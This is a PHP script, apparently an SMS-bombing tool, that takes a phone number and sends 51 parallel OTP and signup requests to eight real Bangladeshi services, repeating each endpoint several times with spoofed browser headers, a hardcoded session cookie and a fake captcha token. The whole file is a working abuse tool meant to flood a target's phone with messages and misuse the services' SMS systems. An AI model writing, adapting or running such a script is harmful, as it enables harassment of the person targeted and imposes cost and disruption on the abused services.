<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors',1);

// Validate phone
$phone = $_GET['phone'] ?? '';
if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number. Use 01XXXXXXXXX"]));
}

// Phone normalization
$phone_11 = preg_replace('/^\+?88/', '', $phone);
if(substr($phone_11,0,1)!=="0") $phone_11 = "0".$phone_11;
$phone_88 = "88".$phone_11;
$phone_plus88 = "+88".$phone_11;

// Prepare all API requests
$api_requests = [];

// 1. Shwapno (5 times)
for($i=1;$i<=5;$i++){
    $api_requests[] = [
        "name"=>"shwapno_$i",
        "url"=>"https://www.shwapno.com/api/auth",
        "data"=>["phoneNumber"=>$phone_plus88],
        "headers"=>[
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Linux; Android 10)',
            'Origin: https://www.shwapno.com',
            'Referer: https://www.shwapno.com/',
            'Cookie: cuid=98a49521-6662-498f-94eb-17d71974083f; _nc_=true; _ds_=65eb62a4452e887cd78e256b'
        ]
    ];
}

// 2. Garibook (5 times)
for($i=1;$i<=5;$i++){
    $api_requests[] = [
        "name"=>"garibook_$i",
        "url"=>"https://api.garibookadmin.com/api/v4/user/login",
        "data"=>["mobile"=>$phone_plus88,"recaptcha_token"=>"garibookcaptcha","channel"=>"web"],
        "headers"=>[
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Linux; Android 10)',
            'Origin: https://garibook.com',
            'Referer: https://garibook.com/'
        ]
    ];
}

// 3. Shikho (3 times)
for($i=1;$i<=3;$i++){
    $api_requests[] = [
        "name"=>"shikho_$i",
        "url"=>"https://api.shikho.com/auth/v2/send/sms",
        "data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],
        "headers"=>['Content-Type: application/json','Origin: https://shikho.com']
    ];
}

// 4. RedX (10 times)
for($i=1;$i<=10;$i++){
    $api_requests[] = [
        "name"=>"redx_$i",
        "url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        "data"=>["phoneNumber"=>$phone_11],
        "headers"=>['Content-Type: application/json']
    ];
}

// 5. Bikroy (10 times)
for($i=1;$i<=10;$i++){
    $api_requests[] = [
        "name"=>"bikroy_$i",
        "url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11",
        "data"=>[],
        "headers"=>['User-Agent: Mozilla/5.0']
    ];
}

// 6. PBS (5 times)
for($i=1;$i<=5;$i++){
    $api_requests[] = [
        "name"=>"pbs_$i",
        "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP",
        "data"=>["userPhone"=>$phone_11],
        "headers"=>['Content-Type: application/json']
    ];
}

// 7. Iqra Live (3 times)
for($i=1;$i<=3;$i++){
    $api_requests[] = [
        "name"=>"iqra_$i",
        "url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,
        "data"=>[],
        "headers"=>['User-Agent: Mozilla/5.0']
    ];
}

// 8. BDTickets (10 times)
for($i=1;$i<=10;$i++){
    $api_requests[] = [
        "name"=>"bdtickets_$i",
        "url"=>"https://api.bdtickets.com:20100/v1/auth",
        "data"=>["createUserCheck"=>true,"phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],
        "headers"=>[
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0 (Linux; Android 10)'
        ]
    ];
}

// Parallel cURL execution
$results = [];
$multiCurl = [];
$mh = curl_multi_init();

// Initialize cURL handles
foreach($api_requests as $key => $api){
    $ch = curl_init();
    curl_setopt_array($ch,[
        CURLOPT_URL => $api['url'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($api['data']),
        CURLOPT_HTTPHEADER => $api['headers'],
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => true
    ]);
    $multiCurl[$key] = $ch;
    curl_multi_add_handle($mh,$ch);
}

// Execute all in parallel
$running = null;
do {
    curl_multi_exec($mh,$running);
    curl_multi_select($mh);
} while($running > 0);

// Collect results
foreach($multiCurl as $key => $ch){
    $res = curl_multi_getcontent($ch);
    $error = curl_error($ch);
    $http = curl_getinfo($ch,CURLINFO_HTTP_CODE);
    $results[$api_requests[$key]['name']] = [
        "status_code"=>$http,
        "error"=>$error ?: null,
        "response"=>$res
    ];
    curl_multi_remove_handle($mh,$ch);
    curl_close($ch);
}

curl_multi_close($mh);

echo json_encode(["status"=>"completed","results"=>$results], JSON_PRETTY_PRINT);
